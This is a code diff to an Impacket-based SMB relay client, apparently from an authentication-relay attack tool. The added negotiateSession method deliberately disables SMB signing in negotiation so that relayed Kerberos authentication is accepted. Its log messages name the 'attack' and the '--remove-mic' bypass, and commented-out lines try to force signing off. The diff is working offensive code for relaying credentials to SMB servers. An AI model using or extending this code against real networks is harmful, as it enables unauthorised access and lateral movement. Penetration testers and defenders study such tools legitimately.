@@ -22,7 +22,7 @@ from impacket.nt_errors import STATUS_SUCCESS
 from impacket.smb import SMB, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
     SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
     SMBSessionSetupAndX_Extended_Response_Parameters
-from impacket.smb3 import SMB3, SMB2_NEGOTIATE_SIGNING_ENABLED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP
+from impacket.smb3 import SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30, SMB2_DIALECT_WILDCARD, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB3, SMB2_NEGOTIATE_SIGNING_ENABLED, SMB2Negotiate, SMB2Negotiate_Response, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, SMB3Packet
 from impacket.smbconnection import SMBConnection, SessionError
 from binascii import a2b_hex
 from impacket.krb5.kerberosv5 import KerberosError
@@ -89,10 +89,79 @@ class MYSMB3(SMB3):
         self.extendedSecurity = extendedSecurity
         SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket))
 
+    def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
+        # We DON'T want to sign
+        self._Connection['ClientSecurityMode'] = 0
+
+        if self.RequireMessageSigning is True:
+            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
+            return
+
+        self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
+        currentDialect = SMB2_DIALECT_WILDCARD
+
+        # Do we have a negSessionPacket already?
+        if negSessionResponse is not None:
+            # Yes, let's store the dialect answered back
+            negResp = SMB2Negotiate_Response(negSessionResponse['Data'])
+            currentDialect = negResp['DialectRevision']
+
+        if currentDialect == SMB2_DIALECT_WILDCARD:
+            # Still don't know the chosen dialect, let's send our options
+
+            packet = self.SMB_PACKET()
+            packet['Command'] = SMB2_NEGOTIATE
+            negSession = SMB2Negotiate()
+
+            negSession['SecurityMode'] = self._Connection['ClientSecurityMode']
+            negSession['Capabilities'] = self._Connection['Capabilities']
+            negSession['ClientGuid'] = self.ClientGuid
+            if preferredDialect is not None:
+                negSession['Dialects'] = [preferredDialect]
+            else:
+                negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]
+            negSession['DialectCount'] = len(negSession['Dialects'])
+            packet['Data'] = negSession
+
+            packetID = self.sendSMB(packet)
+            ans = self.recvSMB(packetID)
+            if ans.isValidAnswer(STATUS_SUCCESS):
+                negResp = SMB2Negotiate_Response(ans['Data'])
+
+        self._Connection['MaxTransactSize']   = min(0x100000,negResp['MaxTransactSize'])
+        self._Connection['MaxReadSize']       = min(0x100000,negResp['MaxReadSize'])
+        self._Connection['MaxWriteSize']      = min(0x100000,negResp['MaxWriteSize'])
+        self._Connection['ServerGuid']        = negResp['ServerGuid']
+        self._Connection['GSSNegotiateToken'] = negResp['Buffer']
+        self._Connection['Dialect']           = negResp['DialectRevision']
+        if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
+            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
+            return
+        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
+            self._Connection['SupportsFileLeasing'] = True
+        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU) == SMB2_GLOBAL_CAP_LARGE_MTU:
+            self._Connection['SupportsMultiCredit'] = True
+
+        if self._Connection['Dialect'] == SMB2_DIALECT_30:
+            # Switching to the right packet format
+            self.SMB_PACKET = SMB3Packet
+            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_DIRECTORY_LEASING) == SMB2_GLOBAL_CAP_DIRECTORY_LEASING:
+                self._Connection['SupportsDirectoryLeasing'] = True
+            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_MULTI_CHANNEL) == SMB2_GLOBAL_CAP_MULTI_CHANNEL:
+                self._Connection['SupportsMultiChannel'] = True
+            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_PERSISTENT_HANDLES) == SMB2_GLOBAL_CAP_PERSISTENT_HANDLES:
+                self._Connection['SupportsPersistentHandles'] = True
+            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION) == SMB2_GLOBAL_CAP_ENCRYPTION:
+                self._Connection['SupportsEncryption'] = True
+
+            self._Connection['ServerCapabilities'] = negResp['Capabilities']
+            self._Connection['ServerSecurityMode'] = negResp['SecurityMode']
+            
     def kerberos_apreq_login(self, authdata_gssapi):
         sessionSetup = SMB2SessionSetup()
 
         sessionSetup['SecurityMode'] = SMB2_NEGOTIATE_SIGNING_ENABLED
+        #sessionSetup['SecurityMode'] = 0
 
         sessionSetup['Flags'] = 0
 
@@ -191,6 +260,7 @@ class SMBRelayClient(ProtocolClient):
             # Answer is SMB packet, sticking to SMBv1
             smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
 
+        # smbClient._Connection['RequireSigning'] = False
         try:
             smbClient.kerberos_apreq_login(authdata["krbauth"])
         except (smb.SessionError, smb3.SessionError) as e:
@@ -198,6 +268,7 @@ class SMBRelayClient(ProtocolClient):
         except KerberosError as e:
             raise e
         
+       # smbClient._Connection['RequireSigning'] = False
         if smbClient.is_signing_required():
             LOG.error("The Attack won't work, the target server enforce signing.")
             return False
